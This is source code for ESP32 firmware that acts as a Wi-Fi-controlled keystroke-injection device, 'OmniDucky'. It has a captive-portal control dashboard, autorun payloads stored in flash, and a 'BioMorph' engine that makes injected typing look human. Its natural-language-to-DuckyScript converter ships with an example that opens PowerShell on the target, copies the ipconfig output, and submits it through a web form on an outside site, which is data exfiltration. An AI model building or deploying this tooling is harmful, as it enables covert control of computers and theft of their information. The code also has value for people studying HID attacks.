                        'GUI r', 'DELAY 600', 'STRINGLN powershell', 'DELAY 2000',
                        'STRING ipconfig | Out-String | Set-Clipboard', 'ENTER', 'DELAY 1500');
            activeApp = 'powershell';
            clipboardState = 'ip_address';
          }
          continue;
        }

        // ── NAVIGATE TO URL ──
        const urlMatch = c.match(/(?:go\s+to|navigate\s+to|visit|open)\s+(https?:\/\/[^\s]+|[\w\-]+\.[a-z]{2,}[^\s]*)/i);
        if (urlMatch) {
          const url = urlMatch[1].includes('://') ? urlMatch[1] : 'https://' + urlMatch[1];
          if (activeApp === 'chrome' || activeApp === 'edge') {
            lines.push('CTRL l', 'DELAY 400', 'STRING ' + url, 'ENTER', 'DELAY 2500');
          } else {
            lines.push('GUI r', 'DELAY 600', 'STRING ' + url, 'ENTER', 'DELAY 3000');
            activeApp = 'chrome';
          }
          formTabIndex = 0; // reset form state on new page load
          continue;
        }

        // ── SCROLL TO ELEMENT ──
        // e.g. "scroll to contact form", "scroll to the contact section"
        const scrollMatch = c.match(/scroll\s+(?:to|down\s+to)\s+(?:the\s+)?(.+)/i);
        if (scrollMatch) {
          const target = scrollMatch[1].trim();
          // Heuristic: estimate scroll depth based on element name keywords
          let scrollPasses = 4;
          if (/contact|form|footer|bottom|end/i.test(target)) scrollPasses = 6;
          if (/top|header|hero|nav/i.test(target)) {
            lines.push('CTRL HOME', 'DELAY 300');
          } else {
            scrollToElement(target, scrollPasses);
          }
          formTabIndex = 0;
          continue;
        }

        // ── FILL FORM FIELD BY LABEL ──
        let fieldLabel = null;
        let valueExpr = null;

        const fillMatch1 = c.match(/(?:fill\s+(?:in\s+)?(?:the\s+)?)(.+?)\s+(?:box|field|input|area)?\s*with\s+(.+)/i);
        const fillMatch2 = c.match(/in\s+(?:the\s+)?(.+?)\s+(?:box|field|input|area)?\s*fill\s+(?:the\s+|with\s+)?(.+)/i);
        const fillMatch3 = c.match(/fill\s+(?:the\s+)?(.+?)\s+(?:box|field|input|area)?\s+(?:with\s+)?(.+)/i);

        if (fillMatch1) {
          fieldLabel = fillMatch1[1].trim();
          valueExpr = fillMatch1[2].trim();
        } else if (fillMatch2) {
          fieldLabel = fillMatch2[1].trim();
          valueExpr = fillMatch2[2].trim();
        } else if (fillMatch3 && !/file|screen|window/i.test(fillMatch3[1])) {
          fieldLabel = fillMatch3[1].trim();
          valueExpr = fillMatch3[2].trim();
        }

        if (fieldLabel && valueExpr) {
          lines.push('REM TAB to: ' + fieldLabel);
          lines.push('TAB', 'DELAY 300');
          lines.push('CTRL a', 'DELAY 100', 'DELETE', 'DELAY 100');
          formTabIndex++;

          // Resolve the value
          if (/random\s+(?:email|mail|e-mail)/i.test(valueExpr)) {
            lines.push('REM Fill ' + fieldLabel + ' with random email');
            lines.push('STRING ' + randomEmail());
          } else if (/(?:the\s+)?ip|machine|details|info/i.test(valueExpr)) {
            if (clipboardState === 'ip_address') {
              lines.push('REM Paste clipboard (network/machine info) into ' + fieldLabel);
              lines.push('CTRL v');
            } else {
              lines.push('REM [WARN] No IP in clipboard yet — inserting placeholder');
              lines.push('STRING [IP-ADDRESS-HERE]');
            }
          } else if (/(?:the\s+)?clip(?:board)?|(?:what\s+(?:is\s+)?)?copied/i.test(valueExpr)) {
            lines.push('REM Paste clipboard into ' + fieldLabel);
            lines.push('CTRL v');
          } else {
            // Literal value
            const literal = valueExpr.replace(/^["']|["']$/g, '').trim();
            lines.push('REM Fill ' + fieldLabel + ' with: ' + literal);
            lines.push('STRING ' + literal);
          }
          lines.push('DELAY 300');
          continue;
        }

        // ── SUBMIT FORM ──
        if (/submit\s*(?:form|it|the\s*form)?|send\s+(?:it|form|the\s*form)/i.test(c)) {
          lines.push(
            'REM Submit form — TAB to submit button and press ENTER',
            'TAB', 'DELAY 200',
            'ENTER',
            'DELAY 2000'
          );
          formTabIndex = 0;
          continue;
        }

        // ── SEARCH (Context-Aware) ──
        const searchMatch = c.match(/(?:search\s+(?:for\s+)?|find\s+)(.+)/i);
        if (searchMatch) {
          const query = searchMatch[1].trim();
          if (activeApp === 'explorer') {
            lines.push('CTRL e', 'DELAY 600', 'STRING ' + query, 'ENTER', 'DELAY 1200');
          } else if (activeApp === 'chrome' || activeApp === 'edge') {
            const encoded = encodeURIComponent(query).replace(/%20/g, '+');
            lines.push('CTRL l', 'DELAY 400', 'STRING https://www.google.com/search?q=' + encoded, 'ENTER', 'DELAY 1500');
          } else if (activeApp === 'notepad') {
            lines.push('CTRL f', 'DELAY 500', 'STRING ' + query, 'ENTER');
          } else {
            lines.push('GUI s', 'DELAY 800', 'STRING ' + query, 'DELAY 500', 'ENTER', 'DELAY 1500');
          }
          continue;
        }

        // ── TYPE TEXT ──
        const typeMatch = c.match(/(?:type|write|say)\s+["']?(.+?)["']?$/i);
        if (typeMatch) {
          lines.push('DELAY 400', 'STRING ' + typeMatch[1].trim());
          continue;
        }

        // ── RUN GENERIC COMMAND ──
        const runCmdMatch = c.match(/(?:run|execute)\s+(.+)/i);
        if (runCmdMatch) {
          lines.push('DELAY 400', 'STRING ' + runCmdMatch[1].trim(), 'ENTER');
          continue;
        }

        // ── PRESS ENTER ──
        if (/(?:press\s+enter|hit\s+enter|confirm)/i.test(c)) {
          lines.push('ENTER');
          continue;
        }

        // ── SAVE FILE ──
        if (/save\s*(?:it|the\s*file|file)?/i.test(c)) {
          lines.push('DELAY 400', 'CTRL s', 'DELAY 800');
          continue;
        }

        // ── COPY / PASTE ──
        if (/copy\s*(?:all|everything|it)?/i.test(c)) {
          lines.push('CTRL a', 'DELAY 150', 'CTRL c');
          clipboardState = 'text';
          continue;
        }
        if (/paste/i.test(c)) {
          lines.push('CTRL v');
          continue;
        }

        // ── CLOSE ──
        if (/close\s*(?:it|window|tab|app)?/i.test(c)) {
          lines.push('ALT F4', 'DELAY 500');
          activeApp = null;
          continue;
        }

        // ── LOCK SCREEN ──
        if (/lock\s*(?:screen|computer|pc)?/i.test(c)) {
          lines.push('GUI l');
          continue;
        }

        // ── SCREENSHOT ──
        if (/screenshot/i.test(c)) {
          lines.push('GUI PRINTSCREEN', 'DELAY 600');
          continue;
        }

        // ── MINIMIZE / MAXIMIZE ──
        if (/minimize/i.test(c)) { lines.push('GUI d'); continue; }
        if (/maximize/i.test(c)) { lines.push('GUI UP'); continue; }

        // ── WAIT / DELAY ──
        const delayMatch = c.match(/wait\s+(\d+)\s*(seconds?|ms|milliseconds?)?/i);
        if (delayMatch) {
          const ms = delayMatch[2] && delayMatch[2].startsWith('ms') ? parseInt(delayMatch[1]) : parseInt(delayMatch[1]) * 1000;
          lines.push('DELAY ' + ms);
          continue;
        }

        // ── MOUSE CLICK ──
        if (/(?:left\s*)?click/i.test(c) && !/right\s*click/i.test(c)) {
          lines.push('MOUSE_CLICK LEFT');
          continue;
        }
        if (/right\s*click/i.test(c)) {
          lines.push('MOUSE_CLICK RIGHT');
          continue;
        }

        // ── UNRECOGNIZED ── (append as comment so user can see what failed)
        lines.push('REM [UNRECOGNIZED CLAUSE]: ' + c);
      }

      if (lines.length === 2) {
        lines.push('REM Could not parse any clauses from: ' + rawText);
        lines.push('REM Example: "open powershell and run ipconfig and copy the ip address, navigate to vishwak.tech, scroll to contact form, fill the email box with a random email, fill the description with the ip address, submit form"');
      }

      return lines.join('\n');
    }
  </script>
</body>
</html>
)rawliteral";

// ============================================================================
//  ARDUINO SETUP & MAIN LOOP
// ============================================================================
void setup() {
  Serial.begin(115200);
  pinMode(LED_BUILTIN, OUTPUT);
  pinMode(BOOT_BUTTON_PIN, INPUT_PULLUP);

  // 1. Initialize USB HID Keyboard & Mouse
  usbKeyboard.begin();
  usbMouse.begin();
  USB.begin();

  // 2. Load stored Autorun payload from non-volatile flash
  preferences.begin("omniducky", false);
  currentScript = preferences.getString("autorun", "");
  autorunEnabled = preferences.getBool("auto_enabled", true);

  // 3. Configure Wi-Fi SoftAP
  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(apIP, apIP, netMsk);
  WiFi.softAP(AP_SSID, (strlen(AP_PASS) > 0 ? AP_PASS : NULL));

  Serial.println("[+] OmniDucky C2 Online!");
  Serial.print("[+] Wi-Fi AP: "); Serial.println(AP_SSID);
  Serial.print("[+] Dashboard: http://"); Serial.println(WiFi.softAPIP());

  // 4. Captive Portal DNS Server (redirects all domains to 192.168.4.1)
  dnsServer.start(DNS_PORT, "*", apIP);

  // 5. Web Server Routes
  server.on("/", HTTP_GET, handleRoot);
  server.on("/api/run", HTTP_POST, handleRun);
  server.on("/api/save", HTTP_POST, handleSave);
  server.on("/api/load", HTTP_GET, []() {
    server.send(200, "text/plain", currentScript);
  });
  server.on("/api/status", HTTP_GET, handleStatus);
  server.onNotFound(handleNotFound);
  server.begin();

  // 6. Autorun Execution (if plugged into target PC)
  delay(1500); // Give USB time to enumerate on host
  if (autorunEnabled && currentScript.length() > 0) {
    Serial.println("[*] Executing Autorun payload from flash...");
    executeDuckyScript(currentScript);
  }
}

void loop() {
  dnsServer.processNextRequest();
  server.handleClient();

  // Re-trigger via physical BOOT button (GPIO 0)
  if (digitalRead(BOOT_BUTTON_PIN) == LOW) {
    delay(400); // debounce
    if (currentScript.length() > 0) {
      Serial.println("[*] BOOT button triggered: Executing payload...");
      executeDuckyScript(currentScript);
    }
  }
}

// ============================================================================
//  WEB SERVER HANDLERS
// ============================================================================
void handleRoot() {
  server.send_P(200, "text/html", INDEX_HTML);
}

void handleRun() {
  if (server.hasArg("plain")) {
    String script = server.arg("plain");
    server.send(200, "text/plain", "Executing payload...");
    executeDuckyScript(script);
  } else {
    server.send(400, "text/plain", "Missing script payload");
  }
}

void handleSave() {
  if (server.hasArg("plain")) {
    currentScript = server.arg("plain");
    preferences.putString("autorun", currentScript);
    server.send(200, "text/plain", "Saved as Autorun");
  } else {
    server.send(400, "text/plain", "Missing script payload");
  }
}

void handleStatus() {
  String json = "{\"status\":\"online\",\"injecting\":" + String(isInjecting ? "true" : "false") + "}";
  server.send(200, "application/json", json);
}

void handleNotFound() {
  // Captive Portal Redirect
  server.sendHeader("Location", "http://192.168.4.1/", true);
  server.send(302, "text/plain", "");
}

// ============================================================================
//  ON-CHIP DUCKY SCRIPT INTERPRETER
// ============================================================================
void moveToScreenPercent(float pctX, float pctY, int screenW, int screenH) {
  // Corner-reset: slam to (0,0)
  for (int i = 0; i < 25; i++) {
    usbMouse.move(-120, -120);
    delay(5);
  }
  delay(80);

  int targetX = (int)((pctX / 100.0f) * screenW);
  int targetY = (int)((pctY / 100.0f) * screenH);

  while (targetX > 0 || targetY > 0) {
    int stepX = (targetX > 100) ? 100 : targetX;
    int stepY = (targetY > 100) ? 100 : targetY;
    usbMouse.move(stepX, stepY);
    targetX -= stepX;
    targetY -= stepY;
    delay(5);
  }
  delay(50);
}

void pressModifier(const String& mod) {
  if (mod == "GUI" || mod == "WIN" || mod == "WINDOWS" || mod == "COMMAND") usbKeyboard.press(KEY_LEFT_GUI);
  else if (mod == "CTRL" || mod == "CONTROL") usbKeyboard.press(KEY_LEFT_CTRL);
  else if (mod == "ALT") usbKeyboard.press(KEY_LEFT_ALT);
  else if (mod == "SHIFT") usbKeyboard.press(KEY_LEFT_SHIFT);
}

void pressKey(const String& key) {
  if (key == "ENTER" || key == "RETURN") usbKeyboard.press(KEY_RETURN);
  else if (key == "ESCAPE" || key == "ESC") usbKeyboard.press(KEY_ESC);
  else if (key == "BACKSPACE") usbKeyboard.press(KEY_BACKSPACE);
  else if (key == "TAB") usbKeyboard.press(KEY_TAB);
  else if (key == "SPACE") usbKeyboard.press(' ');
  else if (key == "CAPSLOCK") usbKeyboard.press(KEY_CAPS_LOCK);
  else if (key == "DELETE" || key == "DEL") usbKeyboard.press(KEY_DELETE);
  else if (key == "PRINTSCREEN") usbKeyboard.press(KEY_PRINT_SCREEN);
  else if (key == "UPARROW" || key == "UP") usbKeyboard.press(KEY_UP_ARROW);
  else if (key == "DOWNARROW" || key == "DOWN") usbKeyboard.press(KEY_DOWN_ARROW);
  else if (key == "LEFTARROW" || key == "LEFT") usbKeyboard.press(KEY_LEFT_ARROW);
  else if (key == "RIGHTARROW" || key == "RIGHT") usbKeyboard.press(KEY_RIGHT_ARROW);
  else if (key.length() == 1) usbKeyboard.press(key[0]);
}

bool isDuckyLine(const String& line) {
  String upper = line;
  upper.toUpperCase();
  upper.trim();

  if (upper.startsWith("REM") || upper.startsWith("DELAY ") || 
      upper.startsWith("DEFAULT_DELAY ") || upper.startsWith("DEFAULTDELAY ") ||
      upper.startsWith("STRING ") || upper.startsWith("STRINGLN ") ||
      upper.startsWith("REPEAT ") || upper.startsWith("SCREEN_SIZE ") ||
      upper.startsWith("MOUSE_")) {
    return true;
  }

  int sp = upper.indexOf(' ');
  String firstToken = (sp == -1) ? upper : upper.substring(0, sp);

  if (firstToken == "GUI" || firstToken == "WIN" || firstToken == "WINDOWS" || firstToken == "COMMAND" ||
      firstToken == "CTRL" || firstToken == "CONTROL" || firstToken == "ALT" || firstToken == "SHIFT" ||
      firstToken == "ENTER" || firstToken == "RETURN" || firstToken == "ESC" || firstToken == "ESCAPE" ||
      firstToken == "BACKSPACE" || firstToken == "TAB" || firstToken == "SPACE" || firstToken == "CAPSLOCK" ||
      firstToken == "DELETE" || firstToken == "DEL" || firstToken == "PRINTSCREEN" ||
      firstToken == "UP" || firstToken == "DOWN" || firstToken == "LEFT" || firstToken == "RIGHT" ||
      firstToken == "UPARROW" || firstToken == "DOWNARROW" || firstToken == "LEFTARROW" || firstToken == "RIGHTARROW" ||
      firstToken == "PAGEUP" || firstToken == "PAGEDOWN" || firstToken == "HOME" || firstToken == "END" ||
      firstToken == "INSERT" || firstToken == "NUMLOCK" || firstToken == "SCROLLLOCK" ||
      (firstToken.length() >= 2 && firstToken[0] == 'F' && isdigit(firstToken[1]))) {
    return true;
  }

  return false;
}

void executeDuckyScript(const String& script) {
  isInjecting = true;
  digitalWrite(LED_BUILTIN, HIGH);

  int defaultDelay = 0;
  String prevLine = "";
  int startIdx = 0;

  while (startIdx < script.length()) {
    int endIdx = script.indexOf('\n', startIdx);
    if (endIdx == -1) endIdx = script.length();

    String line = script.substring(startIdx, endIdx);
    line.trim();
    startIdx = endIdx + 1;

    if (line.length() == 0 || line.startsWith("REM")) continue;

    if (defaultDelay > 0) delay(defaultDelay);

    // Track previous executable line for REPEAT (skip meta-commands)
    if (!line.startsWith("REPEAT ") && !line.startsWith("DEFAULT_DELAY ") &&
        !line.startsWith("DEFAULTDELAY ") && !line.startsWith("BIOMORPH ") &&
        !line.startsWith("DELAY ") && !line.startsWith("REM")) {
      prevLine = line;
    }

    // DELAY <ms>
    if (line.startsWith("DELAY ")) {
      int ms = line.substring(6).toInt();
      delay(ms);
    }
    // DEFAULT_DELAY <ms>
    else if (line.startsWith("DEFAULT_DELAY ") || line.startsWith("DEFAULTDELAY ")) {
      defaultDelay = line.substring(line.indexOf(' ') + 1).toInt();
    }
    // REPEAT <N> — re-executes the previous command line N additional times
    else if (line.startsWith("REPEAT ")) {
      int repeatCount = line.substring(7).toInt();
      if (repeatCount > 0 && prevLine.length() > 0) {
        for (int r = 0; r < repeatCount; r++) {
          if (defaultDelay > 0) delay(defaultDelay);
          // Inline-execute prevLine (all command types supported)
          if (prevLine.startsWith("STRING ")) {
            bioMorphTypeString(prevLine.substring(7), false);
          } else if (prevLine.startsWith("STRINGLN ")) {
            bioMorphTypeString(prevLine.substring(9), true);
          } else if (prevLine.startsWith("MOUSE_MOVE ")) {
            String a = prevLine.substring(11);
            int sp = a.indexOf(' ');
            if (sp > 0) usbMouse.move(a.substring(0, sp).toInt(), a.substring(sp+1).toInt());
          } else if (prevLine.startsWith("MOUSE_CLICK")) {
            uint8_t btn = MOUSE_LEFT;
            if (prevLine.indexOf("RIGHT") > 0) btn = MOUSE_RIGHT;
            else if (prevLine.indexOf("MIDDLE") > 0) btn = MOUSE_MIDDLE;
            usbMouse.click(btn); delay(40);
          } else if (prevLine.startsWith("MOUSE_SCROLL ")) {
            usbMouse.move(0, 0, prevLine.substring(13).toInt());
          } else if (prevLine.startsWith("DELAY ")) {
            delay(prevLine.substring(6).toInt());
          } else if (isDuckyLine(prevLine)) {
            String upper = prevLine; upper.toUpperCase();
            int p2 = 0;
            while (p2 < upper.length()) {
              int ns = upper.indexOf(' ', p2); if (ns == -1) ns = upper.length();
              String tok = upper.substring(p2, ns); tok.trim(); p2 = ns + 1;
              if (tok.length() == 0) continue;
              if (tok == "GUI" || tok == "WIN" || tok == "CTRL" || tok == "ALT" || tok == "SHIFT") pressModifier(tok);
              else { if (tok.length() == 1) tok.toLowerCase(); pressKey(tok); }
            }
            delay(80); usbKeyboard.releaseAll(); delay(30);
          } else {
            bioMorphTypeString(prevLine, true);
          }
        }
      }
    }
    // BIOMORPH <GHOST|CASUAL_USER|FAST_TYPIST|SLOW_HUNT_PECK|EXAM_STUDENT>
    // Sets the active BioMorph profile for all subsequent STRING/STRINGLN/raw-text
    else if (line.startsWith("BIOMORPH ")) {
      String profileName = line.substring(9);
      profileName.trim();
      profileName.toUpperCase();
      bioMorphMode = 0; // default to GHOST if not found
      for (int pi = 0; pi < BIO_PROFILE_COUNT; pi++) {
        if (profileName == String(BIO_PROFILES[pi].name)) {
          bioMorphMode = pi;
          break;
        }
      }
    }
    // STRING <text>
    else if (line.startsWith("STRING ")) {
      String text = line.substring(7);
      bioMorphTypeString(text, false);
    }
    // STRINGLN <text>
    else if (line.startsWith("STRINGLN ")) {
      String text = line.substring(9);
      bioMorphTypeString(text, true);
    }
    // SCREEN_SIZE <w> <h>
    else if (line.startsWith("SCREEN_SIZE ")) {
      String args = line.substring(12);
      int sp = args.indexOf(' ');
      if (sp > 0) {
        calibratedWidth = args.substring(0, sp).toInt();
        calibratedHeight = args.substring(sp + 1).toInt();
      }
    }
    // MOUSE_POS_PCT <pctX> <pctY>
    else if (line.startsWith("MOUSE_POS_PCT ")) {
      String args = line.substring(14);
      int sp = args.indexOf(' ');
      if (sp > 0) {
        float px = args.substring(0, sp).toFloat();
        float py = args.substring(sp + 1).toFloat();
        moveToScreenPercent(px, py, calibratedWidth, calibratedHeight);
      }
    }
    // MOUSE_MOVE <dx> <dy>
    else if (line.startsWith("MOUSE_MOVE ")) {
      String args = line.substring(11);
      int sp = args.indexOf(' ');
      if (sp > 0) {
        int dx = args.substring(0, sp).toInt();
        int dy = args.substring(sp + 1).toInt();
        usbMouse.move(dx, dy);
      }
    }
    // MOUSE_CLICK [LEFT|RIGHT|MIDDLE]
    else if (line.startsWith("MOUSE_CLICK")) {
      uint8_t btn = MOUSE_LEFT;
      if (line.indexOf("RIGHT") > 0) btn = MOUSE_RIGHT;
      else if (line.indexOf("MIDDLE") > 0) btn = MOUSE_MIDDLE;
      usbMouse.click(btn);
      delay(40);
    }
    // MOUSE_SCROLL <val>
    else if (line.startsWith("MOUSE_SCROLL ")) {
      int s = line.substring(13).toInt();
      usbMouse.move(0, 0, s);
    }
    // KEY COMBINATIONS & SPECIAL KEYS (e.g. GUI r, CTRL ALT DELETE, ENTER)
    else if (isDuckyLine(line)) {
      String upper = line;
      upper.toUpperCase();

      // Tokenize by space
      int p = 0;
      bool hasTokens = false;
      while (p < upper.length()) {
        int nextSpace = upper.indexOf(' ', p);
        if (nextSpace == -1) nextSpace = upper.length();
        String token = upper.substring(p, nextSpace);
        token.trim();
        p = nextSpace + 1;

        if (token.length() == 0) continue;
        hasTokens = true;

        if (token == "GUI" || token == "WIN" || token == "WINDOWS" || token == "CTRL" ||
            token == "ALT" || token == "SHIFT" || token == "COMMAND") {
          pressModifier(token);
        } else {
          // Convert single-char tokens to lowercase so the HID library
          // does NOT add an implicit SHIFT modifier (e.g. 'E' vs 'e').
          // GUI+'E' (uppercase) = WIN+SHIFT+E (wrong).
          // GUI+'e' (lowercase) = WIN+E (correct → File Explorer).
          String ltoken = token;
          if (ltoken.length() == 1) ltoken.toLowerCase();
          pressKey(ltoken);
        }
      }
      delay(80); // 80ms hold time ensures Windows 10/11 shell registers GUI/CTRL/ALT chords
      usbKeyboard.releaseAll();
      delay(30);
    }
    // AUTO-STRING FALLBACK:
    // If the user typed or pasted raw code, plain text, or single words (e.g. 'calc', 'notepad', 'hello'),
    // type it out via BioMorph engine — applies active morphing profile automatically!
    else {
      bioMorphTypeString(line, true);
    }
  }

  digitalWrite(LED_BUILTIN, LOW);
  isInjecting = false;
}
